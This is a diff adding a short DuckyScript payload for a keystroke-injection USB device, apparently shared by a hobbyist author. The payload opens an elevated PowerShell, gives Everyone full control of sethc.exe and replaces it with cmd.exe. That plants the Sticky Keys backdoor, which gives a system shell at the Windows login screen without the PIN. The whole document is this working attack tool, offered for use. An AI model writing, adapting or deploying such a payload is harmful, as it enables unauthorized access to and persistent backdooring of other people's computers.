@@ -1,0 +1,21 @@
+REM Author: UNC0V3R3D (UNC0V3R3D#8662 on Discord)
+REM Description: Switch cmd.exe with sethc.exe, allowing to get access to target pc without knowing the pin.
+REM Version: 1.0
+REM Category: Execution
+DELAY 750
+WINDOWS d
+DELAY 1500
+WINDOWS r
+DELAY 1500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 750
+LEFTARROW
+ENTER
+DELAY 1500
+ALT y
+DELAY 1500
+GUI UP
+DELAY 1500
+STRING copy c:\windows\system32\sethc.exe c:\;$acl = Get-Acl c:\windows\system32\sethc.exe;$AccessRule1 = New-Object System.Security.AccessControl.FileSystemAccessRule("Jeder","FullControl","Allow");$AccessRule2 = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone","FullControl","Allow");$acl.SetAccessRule($AccessRule1);$acl | Set-Acl c:\windows\system32\sethc.exe;$acl.SetAccessRule($AccessRule2);$acl | Set-Acl c:\windows\system32\sethc.exe;Copy-Item -Path c:\windows\system32\cmd.exe -Destination c:\windows\system32\sethc.exe -Recurse -force; exit
+ENTER
